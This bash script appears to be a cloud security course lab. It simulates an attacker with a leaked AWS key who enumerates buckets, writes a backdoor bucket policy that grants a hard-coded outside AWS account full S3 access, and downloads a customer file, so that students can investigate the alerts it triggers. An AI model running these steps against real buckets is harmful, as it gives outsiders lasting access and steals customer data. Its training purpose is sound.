#!/bin/bash

# Arguments:
# - Profile: the AWS CLI profile to use to access credentials
# - Bucket_name: the name of the target bucket you're using in the course (should be deployed by the CloudFormatin script)

# Scenario:
# - An access key was leaked. This is a fairly common issue: https://cloudsec.cybr.com/aws/incident-response/real-world-case-studies/
# - Access key grants access to a user who has access to sensitive S3 data
# - Attacker enumerates basic information
# - Attacker realizes they can update the bucket policy
# - Attacker creates an S3 backdoor by giving their AWS account access to the bucket
# - Attacker exfiltrates sensitive customer data
# (Hopefully) this triggers a detection alert which you then investigate
# You assume your SecurityAnalyst role and investigate with CloudTrail Lake. Refer to the course for next steps!

# Check if two arguments were provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <bucketname> <profile>"
    exit 1
fi

# Assign the provided arguments to variables
bucket_name=$1
profile=$2

echo "Testing access with profile: $profile"
sts_output=$(aws sts get-caller-identity --profile "$profile" --output json 2>&1)
aws_exit_code=$?

if [ $aws_exit_code -eq 0 ]; then
    echo ""
    echo "AWS CLI command executed successfully."
    echo $sts_output
else
    echo ""
    echo "Error executing AWS CLI command:"
    echo "$sts_output"
    exit
fi

# Command succeeded, proceed
mkdir -p ./output
echo "$sts_output" > ./output/results.txt

echo "Continuing with more code in the script..."

aws s3api list-buckets --profile $profile >> ./output/results.txt

existing_policy=$(aws s3api get-bucket-policy --bucket "$bucket_name" --profile "$profile" --output json)

echo "$existing_policy" >> ./output/results.txt

# S3 backdoor inspired by: https://github.com/DataDog/stratus-red-team/blob/main/v2/internal/attacktechniques/aws/exfiltration/s3-backdoor-bucket-policy/malicious_policy.json
modified_policy=$(cat <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::396212980357:root"
            },
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::$bucket_name",
                "arn:aws:s3:::$bucket_name/*"
            ]
        }
    ]
}
EOF
)

echo "Updating bucket policy with our backdoor policy" >> ./output/results.txt

put_bucket_policy=$(aws s3api put-bucket-policy --bucket "$bucket_name" --policy "$modified_policy" --profile $profile)

echo "$put_bucket_policy" >> ./output/results.txt

echo "Uploaded backdoor policy"
echo "Uploaded backdoor policy" >> ./output/results.txt

echo "Listing objects"

listing_objects=$(aws s3api list-objects-v2 --bucket "$bucket_name" --profile $profile)

echo "$listing_objects" >> ./output/results.txt

echo "Downloading sensitive file"
echo "Downloading sensitive file" >> ./output/results.txt
download_file=$(aws s3 cp s3://"$bucket_name"/customers.txt ./output/customers.txt --profile $profile)

echo "$download_file" >> ./output/results.txt
